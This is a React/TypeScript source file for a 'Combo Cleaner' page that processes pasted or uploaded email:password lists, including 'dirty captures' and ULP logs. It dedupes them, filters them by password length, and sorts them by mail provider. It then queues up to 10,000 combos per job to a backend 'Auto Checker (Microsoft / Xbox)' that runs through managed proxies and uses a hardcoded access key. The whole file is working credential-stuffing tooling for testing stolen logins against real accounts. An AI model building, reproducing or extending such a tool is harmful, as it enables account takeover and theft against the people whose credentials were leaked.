import { useMemo, useRef, useState } from "react";
import {
  Upload, Download, Trash2, Filter, Shuffle, Copy, FileText,
  Mail, Sparkles, Package, Eraser, ArrowLeft, Zap, Loader2, Server,
} from "lucide-react";
import { Link } from "react-router-dom";
import { toast } from "sonner";
import { supabase } from "@/integrations/supabase/client";
import AioJobsPanel from "./AioJobsPanel";
import AioProxyPanel from "./AioProxyPanel";
import {
  Combo, parseAll, dedupe, dedupeByEmail, filterByDomains, excludeDomains,
  filterByPasswordLength, removeNumericOnlyPasswords, shuffle, toText,
  groupByProvider, groupByDomain, downloadText, downloadZip,
  MS_DOMAINS, GOOGLE_DOMAINS, YAHOO_DOMAINS, APPLE_DOMAINS, AOL_DOMAINS, PROTON_DOMAINS,
  ProviderKey,
} from "@/lib/comboTools";

const OPEN_KEY = "NEONISTHEGOAT";

const PROVIDER_META: Record<ProviderKey, { label: string; domains: string[]; color: string }> = {
  microsoft: { label: "Microsoft", domains: MS_DOMAINS, color: "text-sky-400" },
  google:    { label: "Google",    domains: GOOGLE_DOMAINS, color: "text-red-400" },
  yahoo:     { label: "Yahoo",     domains: YAHOO_DOMAINS, color: "text-purple-400" },
  apple:     { label: "Apple",     domains: APPLE_DOMAINS, color: "text-zinc-300" },
  aol:       { label: "AOL",       domains: AOL_DOMAINS, color: "text-blue-400" },
  proton:    { label: "Proton",    domains: PROTON_DOMAINS, color: "text-violet-400" },
  other:     { label: "Other",     domains: [], color: "text-muted-foreground" },
};

export default function ComboCleaner() {
  const [text, setText] = useState("");
  const [minLen, setMinLen] = useState(6);
  const [maxLen, setMaxLen] = useState(64);
  const [submitting, setSubmitting] = useState(false);
  const [showProxies, setShowProxies] = useState(false);
  const fileRef = useRef<HTMLInputElement>(null);

  const combos: Combo[] = useMemo(() => parseAll(text), [text]);
  const groups = useMemo(() => groupByProvider(combos), [combos]);
  const domainGroups = useMemo(() => groupByDomain(combos), [combos]);

  const totalLines = text ? text.split(/\r?\n/).filter((l) => l.trim()).length : 0;
  const valid = combos.length;
  const invalid = Math.max(0, totalLines - valid);

  const apply = (next: Combo[], label: string) => {
    setText(toText(next));
    toast.success(`${label} — ${next.length} combos`);
  };

  const onFile = (f: File) => {
    if (f.size > 25 * 1024 * 1024) {
      toast.error("File too large (>25MB)");
      return;
    }
    const r = new FileReader();
    r.onload = () => {
      setText(String(r.result || ""));
      toast.success(`Loaded ${f.name}`);
    };
    r.readAsText(f);
  };

  const onDrop = (e: React.DragEvent) => {
    e.preventDefault();
    const f = e.dataTransfer.files?.[0];
    if (f) onFile(f);
  };

  const copyAll = async () => {
    if (!combos.length) return toast.error("Nothing to copy");
    await navigator.clipboard.writeText(toText(combos));
    toast.success(`Copied ${combos.length} combos`);
  };

  const downloadProvider = (key: ProviderKey) => {
    const list = groups[key];
    if (!list.length) return toast.error(`No ${PROVIDER_META[key].label} combos`);
    downloadText(`${key}_${list.length}.txt`, toText(list));
  };

  const downloadSplitZip = async () => {
    if (!combos.length) return toast.error("Nothing to export");
    const files = (Object.keys(groups) as ProviderKey[])
      .filter((k) => groups[k].length > 0)
      .map((k) => ({ name: `${k}_${groups[k].length}.txt`, content: toText(groups[k]) }));
    files.unshift({ name: `all_${combos.length}.txt`, content: toText(combos) });
    await downloadZip(files, `combos_split_${combos.length}.zip`);
    toast.success("Split zip downloaded");
  };

  const submitCheck = async (subset?: Combo[]) => {
    const list = subset ?? combos;
    if (!list.length) return toast.error("Nothing to check");
    if (list.length > 10000) return toast.error("Max 10,000 combos per job");
    setSubmitting(true);
    try {
      const lines = list.map(c => `${c.email}:${c.pass}`);
      const { data, error } = await supabase.functions.invoke("aio-submit", {
        body: { combos: lines, accessKey: OPEN_KEY, label: `${list.length} combos` },
      });
      if (error) throw new Error(error.message);
      if (data?.error) throw new Error(data.error);
      toast.success(`Queued ${data.queued} combos — auto-checking now`);
    } catch (e) {
      toast.error((e as Error).message);
    }
    setSubmitting(false);
  };

  return (
    <div className="min-h-screen relative overflow-hidden">
      <div className="mesh-dot w-[600px] h-[600px]" style={{ background: "hsl(var(--primary))", top: "-250px", right: "-150px" }} />
      <div className="mesh-dot w-[400px] h-[400px]" style={{ background: "hsl(var(--accent))", bottom: "-100px", left: "-100px", animationDelay: "-8s" }} />

      <header className="relative z-10 flex items-center justify-between px-6 py-4 border-b border-border/20">
        <Link to="/" className="flex items-center gap-2 text-xs text-muted-foreground hover:text-foreground transition-colors">
          <ArrowLeft className="w-3 h-3" /> Back
        </Link>
        <div className="flex items-center gap-2">
          <Sparkles className="w-4 h-4 text-primary" />
          <span className="text-lg font-black tracking-tight text-gradient-neon">COMBO CLEANER</span>
        </div>
        <div className="w-12" />
      </header>

      <main className="relative z-10 max-w-5xl mx-auto px-4 py-6 space-y-4">
        {/* Stats bar */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
          <Stat label="Total lines" value={totalLines} />
          <Stat label="Valid combos" value={valid} accent />
          <Stat label="Invalid" value={invalid} muted />
          <Stat label="Unique domains" value={Object.keys(domainGroups).length} />
        </div>

        {/* Input area */}
        <div
          className="glass rounded-xl p-4 space-y-3"
          onDrop={onDrop}
          onDragOver={(e) => e.preventDefault()}
        >
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2 text-xs uppercase tracking-widest text-muted-foreground">
              <FileText className="w-3 h-3" /> Combo input
            </div>
            <div className="flex items-center gap-2">
              <input
                ref={fileRef}
                type="file"
                accept=".txt,.csv,.log"
                hidden
                onChange={(e) => e.target.files?.[0] && onFile(e.target.files[0])}
              />
              <button
                onClick={() => fileRef.current?.click()}
                className="text-xs flex items-center gap-1 px-3 py-1.5 rounded-md bg-primary/10 border border-primary/20 hover:bg-primary/20 text-primary transition-colors"
              >
                <Upload className="w-3 h-3" /> Load .txt
              </button>
              <button
                onClick={() => { setText(""); toast.success("Cleared"); }}
                className="text-xs flex items-center gap-1 px-3 py-1.5 rounded-md bg-destructive/10 border border-destructive/20 hover:bg-destructive/20 text-destructive transition-colors"
              >
                <Eraser className="w-3 h-3" /> Clear
              </button>
            </div>
          </div>
          <textarea
            value={text}
            onChange={(e) => setText(e.target.value)}
            placeholder="Paste combos here, drag-drop a .txt file, or click 'Load .txt'…&#10;Supports dirty captures (URLs, ULP, mixed garbage). Format: email:password"
            className="w-full h-48 bg-background/40 border border-border/30 rounded-md p-3 text-xs font-mono text-foreground placeholder:text-muted-foreground/50 focus:outline-none focus:border-primary/50 resize-y"
          />
        </div>

        {/* Cleaning actions */}
        <div className="glass rounded-xl p-4 space-y-3">
          <div className="text-xs uppercase tracking-widest text-muted-foreground flex items-center gap-2">
            <Filter className="w-3 h-3" /> Clean & filter
          </div>
          <div className="grid grid-cols-2 md:grid-cols-3 gap-2">
            <ActionBtn icon={<Sparkles className="w-3 h-3" />} label="Keep only mail:pass" onClick={() => apply(combos, "Cleaned to email:pass")} />
            <ActionBtn icon={<Trash2 className="w-3 h-3" />} label="Remove duplicates" onClick={() => apply(dedupe(combos), "Deduped")} />
            <ActionBtn icon={<Mail className="w-3 h-3" />} label="Dedupe by email" onClick={() => apply(dedupeByEmail(combos), "Deduped by email")} />
            <ActionBtn icon={<Shuffle className="w-3 h-3" />} label="Shuffle order" onClick={() => apply(shuffle(combos), "Shuffled")} />
            <ActionBtn icon={<Filter className="w-3 h-3" />} label="Drop numeric-only pw" onClick={() => apply(removeNumericOnlyPasswords(combos), "Removed numeric-only")} />
            <ActionBtn icon={<Copy className="w-3 h-3" />} label="Copy all" onClick={copyAll} />
          </div>

          <div className="flex items-center gap-2 pt-2 border-t border-border/20">
            <span className="text-[11px] text-muted-foreground">Password length</span>
            <input
              type="number" min={1} max={128} value={minLen}
              onChange={(e) => setMinLen(Number(e.target.value) || 0)}
              className="w-16 bg-background/40 border border-border/30 rounded px-2 py-1 text-xs"
            />
            <span className="text-[11px] text-muted-foreground">to</span>
            <input
              type="number" min={1} max={128} value={maxLen}
              onChange={(e) => setMaxLen(Number(e.target.value) || 0)}
              className="w-16 bg-background/40 border border-border/30 rounded px-2 py-1 text-xs"
            />
            <button
              onClick={() => apply(filterByPasswordLength(combos, minLen, maxLen), `Filtered by length ${minLen}-${maxLen}`)}
              className="text-xs px-3 py-1 rounded-md bg-primary/10 border border-primary/20 hover:bg-primary/20 text-primary transition-colors"
            >
              Apply length filter
            </button>
          </div>
        </div>

        {/* Provider split */}
        <div className="glass rounded-xl p-4 space-y-3">
          <div className="flex items-center justify-between">
            <div className="text-xs uppercase tracking-widest text-muted-foreground flex items-center gap-2">
              <Mail className="w-3 h-3" /> Separate by provider
            </div>
            <button
              onClick={downloadSplitZip}
              disabled={!combos.length}
              className="text-xs flex items-center gap-1 px-3 py-1.5 rounded-md bg-accent/10 border border-accent/20 hover:bg-accent/20 text-accent disabled:opacity-40 transition-colors"
            >
              <Package className="w-3 h-3" /> Download split .zip
            </button>
          </div>
          <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
            {(Object.keys(PROVIDER_META) as ProviderKey[]).map((k) => {
              const meta = PROVIDER_META[k];
              const count = groups[k].length;
              return (
                <div key={k} className="bg-background/30 border border-border/30 rounded-lg p-3 flex flex-col gap-2">
                  <div className="flex items-center justify-between">
                    <span className={`text-sm font-bold ${meta.color}`}>{meta.label}</span>
                    <span className="text-xs text-muted-foreground font-mono">{count}</span>
                  </div>
                  <div className="flex gap-1">
                    <button
                      onClick={() => meta.domains.length ? apply(filterByDomains(combos, meta.domains), `Kept ${meta.label}`) : apply(groups.other, "Kept Other")}
                      disabled={!count}
                      className="flex-1 text-[10px] py-1 rounded bg-primary/10 border border-primary/20 hover:bg-primary/20 text-primary disabled:opacity-30 transition-colors"
                    >
                      Keep
                    </button>
                    <button
                      onClick={() => meta.domains.length ? apply(excludeDomains(combos, meta.domains), `Removed ${meta.label}`) : setText(toText(combos.filter((c) => Object.values(PROVIDER_META).slice(0,-1).some((m) => m.domains.includes(c.domain)))))}
                      disabled={!count}
                      className="flex-1 text-[10px] py-1 rounded bg-destructive/10 border border-destructive/20 hover:bg-destructive/20 text-destructive disabled:opacity-30 transition-colors"
                    >
                      Remove
                    </button>
                    <button
                      onClick={() => downloadProvider(k)}
                      disabled={!count}
                      className="text-[10px] px-2 py-1 rounded bg-accent/10 border border-accent/20 hover:bg-accent/20 text-accent disabled:opacity-30 transition-colors"
                    >
                      <Download className="w-3 h-3" />
                    </button>
                  </div>
                </div>
              );
            })}
          </div>
        </div>

        {/* Domain breakdown */}
        {Object.keys(domainGroups).length > 0 && (
          <div className="glass rounded-xl p-4 space-y-2">
            <div className="text-xs uppercase tracking-widest text-muted-foreground">Top domains</div>
            <div className="flex flex-wrap gap-1.5 max-h-40 overflow-y-auto">
              {Object.entries(domainGroups)
                .sort((a, b) => b[1].length - a[1].length)
                .slice(0, 40)
                .map(([d, list]) => (
                  <button
                    key={d}
                    onClick={() => apply(filterByDomains(combos, [d]), `Kept @${d}`)}
                    className="text-[11px] px-2 py-1 rounded-md bg-background/40 border border-border/30 hover:border-primary/40 hover:text-primary transition-colors font-mono"
                  >
                    @{d} <span className="text-muted-foreground">·{list.length}</span>
                  </button>
                ))}
            </div>
          </div>
        )}

        {/* Download */}
        <div className="glass rounded-xl p-4 flex flex-wrap items-center justify-between gap-3">
          <div className="text-xs text-muted-foreground">
            Output: <span className="text-foreground font-mono font-bold">{combos.length}</span> clean combos
          </div>
          <div className="flex gap-2">
            <button
              onClick={() => combos.length ? downloadText(`cleaned_${combos.length}.txt`, toText(combos)) : toast.error("Nothing to download")}
              className="text-xs flex items-center gap-1 px-4 py-2 rounded-md bg-primary text-primary-foreground hover:bg-primary/90 font-bold transition-colors"
            >
              <Download className="w-3 h-3" /> Download .txt
            </button>
          </div>
        </div>

        {/* AIO Check */}
        <div className="glass rounded-xl p-4 space-y-3">
          <div className="flex items-center justify-between flex-wrap gap-2">
            <div className="text-xs uppercase tracking-widest text-muted-foreground flex items-center gap-2">
              <Zap className="w-3 h-3 text-accent" /> Auto Checker (Microsoft / Xbox)
            </div>
            <div className="flex gap-2">
              <button
                onClick={() => setShowProxies(s => !s)}
                className="text-xs flex items-center gap-1 px-3 py-1.5 rounded-md bg-background/40 border border-border/30 hover:border-primary/40 hover:text-primary transition-colors"
              >
                <Server className="w-3 h-3" /> {showProxies ? "Hide" : "Manage"} proxies
              </button>
              <button
                onClick={() => submitCheck()}
                disabled={submitting || !combos.length}
                className="text-xs flex items-center gap-1.5 px-4 py-1.5 rounded-md bg-accent text-accent-foreground hover:bg-accent/90 font-bold disabled:opacity-40 transition-colors"
              >
                {submitting ? <Loader2 className="w-3 h-3 animate-spin" /> : <Zap className="w-3 h-3" />}
                Check {combos.length.toLocaleString()} combos
              </button>
            </div>
          </div>
          <p className="text-[11px] text-muted-foreground">
            Combos are queued and auto-checked in the background. Close the tab anytime — checks keep running. Results appear live below and persist forever.
          </p>
          {showProxies && <AioProxyPanel adminKey={OPEN_KEY} />}
          <AioJobsPanel accessKey={OPEN_KEY} />
        </div>
      </main>
    </div>
  );
}



function Stat({ label, value, accent, muted }: { label: string; value: number; accent?: boolean; muted?: boolean }) {
  return (
    <div className={`glass rounded-lg p-3 ${accent ? "border border-primary/30" : ""}`}>
      <div className="text-[10px] uppercase tracking-widest text-muted-foreground">{label}</div>
      <div className={`text-xl font-black font-mono ${accent ? "text-primary" : muted ? "text-muted-foreground" : "text-foreground"}`}>
        {value.toLocaleString()}
      </div>
    </div>
  );
}

function ActionBtn({ icon, label, onClick }: { icon: React.ReactNode; label: string; onClick: () => void }) {
  return (
    <button
      onClick={onClick}
      className="text-xs flex items-center gap-2 px-3 py-2 rounded-md bg-background/40 border border-border/30 hover:border-primary/40 hover:text-primary transition-colors text-left"
    >
      {icon} {label}
    </button>
  );
}
